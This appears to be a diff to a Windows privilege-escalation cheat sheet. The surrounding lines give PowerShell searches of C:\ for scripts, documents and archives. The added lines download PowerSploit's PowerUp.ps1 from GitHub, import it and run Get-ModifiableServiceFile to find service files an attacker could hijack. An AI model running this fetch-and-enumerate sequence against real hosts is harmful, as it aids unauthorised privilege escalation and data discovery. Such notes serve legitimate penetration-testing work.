@@ -59,6 +59,13 @@ PS> Get-ChildItem -Path C:\ -Include *.bat,*.vbs,*.js,*.asp,*.aspx,*.js,*.ps1,*.
 PS> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.xlsm,*.doc,*.docx,*.docm,*.ppt,*.pptx -File -Recurse -ErrorAction SilentlyContinue
 PS> Get-ChildItem -Path C:\ -Include *.rar,*.zip,*.iso,*.tar,*.7z -File -Recurse -ErrorAction SilentlyContinue
 </pre>
+* Searching 'modifiable service files'
+  * Powersploit (PowerUp.ps1)
+<pre>
+PS> Invoke-WebRequest -Uri "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" -OutFile .\PowerUp.ps1
+PS> Import-Module .\PowerUp.ps1
+PS> Get-ModifiableServiceFile
+</pre>
 ## Powershell history
 <pre>
 PS> Get-History
